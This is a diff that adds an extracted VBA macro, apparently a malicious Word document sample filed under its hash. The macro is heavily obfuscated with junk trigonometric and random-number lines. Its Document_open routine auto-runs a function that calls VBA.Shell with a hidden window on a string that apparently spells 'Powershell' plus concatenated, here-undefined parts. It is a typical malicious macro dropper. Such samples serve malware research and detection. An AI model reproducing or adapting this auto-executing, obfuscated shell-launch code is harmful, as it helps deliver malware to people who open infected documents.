@@ -1,0 +1,81 @@
+Filename     : ./macros/924c4763e596bfaae7dc9986c873b40d76205f0c233f40849e8cb4e3160fe8c3
+OLE stream   : Macros/VBA/MwmQJVCkpVlcb
+VBA filename : MwmQJVCkpVlcb.cls
+----------------------------------------
+Attribute VB_Name = "MwmQJVCkpVlcb"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Function kiijoHIOIrf()
+On Error Resume Next
+OzrinG = Tan(20131)
+iCcTSm = zSkSrA
+CzJjMS = CDbl(TJqMAC * CDbl(AbBik + Int(QUcHAj * Rnd(49402)) * aQMOz * Log(78219 * FhWLr - LslGR + Fix(51))))
+vutfT = pEbrAi
+iWBfc = CDbl(QstdwD)
+UYErCY = Tan(20134)
+pJnCS = Tan(96879)
+Ynjjqi = kSzIIO
+TCzDU = CDbl(VKGfA * CDbl(ciuIMF + Int(QpHLMo * Rnd(69961)) * EmcisU * Log(60698 * TliEuR - jDfuG + Fix(51))))
+raXhBv = baIhud
+LqlOkT = CDbl(YiwIc)
+KWjhY = Tan(15593)
+qpLMM = Tan(34848)
+dAPTaB = CHXSJY
+mFBWz = CDbl(liDUG * CDbl(BvpQiG + Int(MzWShV * Rnd(95142)) * YAJcUF * Log(98844 * jiDWwu - wvNlzt + Fix(51))))
+FGlfj = SCZXU
+nUBCS = CDbl(husmk)
+OcojZW = Tan(131)
+jpdaw = Tan(18680)
+hawKBT = hNCCbB
+oGFJcM = CDbl(PqPzRE * CDbl(AXZcir + Int(iKbdQ * Rnd(43772)) * pXUtjB * Log(6299 * EKovz - kjKkP + Fix(51))))
+WuSOn = tDudRs
+KwdjMp = CDbl(aTvGi)
+wsLJUQ = Tan(14252)
+kiijoHIOIrf = qpNnumc + VBA.Shell(uPsVGsutpU + Chr(ViGfhmcjGr + vbKeyP + wzNJJTpkPi) + "owers" + boCvXzpW + PaPPH + hBBzHZtXXjr + ORjpTU + cUdtwrjbw + JVNAEGo, 11152 - 11152)
+jiQsk = Tan(85867)
+ZtJbi = FnrRlD
+MjlWO = CDbl(NQYPSL * CDbl(LWFaZB + Int(Iidlr * Rnd(70157)) * dFLcr * Log(27501 * nlSdfH - JAdrPp + Fix(51))))
+kmzut = zdAucu
+iDAfia = CDbl(KMmazw)
+SEztt = Tan(93129)
+LWozp = Tan(77561)
+iSwAj = wnqQR
+swvTwq = CDbl(uFDFC * CDbl(fonRCT + Int(CSCUzt * Rnd(25851)) * BpJdKD * Log(5571 * bbmREB - fMvRB + Fix(51))))
+LqPBXB = WHDbM
+wbUEcq = CDbl(Ptcsfc)
+uXvkHV = Tan(91976)
+End Function
+Private Sub Document_open()
+On Error Resume Next
+XnEoO = Tan(78516)
+zAGhoN = kmkDl
+TzjYv = CDbl(mIZTQ * CDbl(QaDwXv + Int(QzsLj * Rnd(64922)) * JthkW * Log(1388 * nvqnwk - cUajq + Fix(51))))
+diMIaK = nfSis
+VZbowq = CDbl(ItbpwP)
+pTVjU = Tan(29631)
+rKJdKP = Tan(39751)
+NUCqF = uitkj
+SuIrjn = CDbl(LhtJJE * CDbl(slEjU + Int(uRPKK * Rnd(36022)) * IZFmh * Log(90524 * KvOzM - EJnULs + Fix(51))))
+DwWHXn = ldvzS
+AizjNS = CDbl(lcHbO)
+pWosVi = Tan(40424)
+kiijoHIOIrf
+KjapB = Tan(89247)
+JRQQwO = XLMjdA
+NmWncJ = CDbl(XjwOjp * CDbl(WBfJo + Int(tfGrYY * Rnd(54501)) * SjPoj * Log(79100 * dEppQs - hRBSYK + Fix(51))))
+swqTXG = zopGz
+jiOEhj = CDbl(zjZAA)
+dwPbcS = Tan(50779)
+qlloB = Tan(93789)
+DwZali = iiicS
+YINpG = CDbl(vnjrp * CDbl(EQVww + Int(aVFiwW * Rnd(31860)) * ouYPFN * Log(76935 * sCuNih - HUEkRj + Fix(51))))
+XSCjLt = wOrmwB
+qMrYY = CDbl(BOTlcU)
+LIDpz = Tan(59351)
+End Sub
+
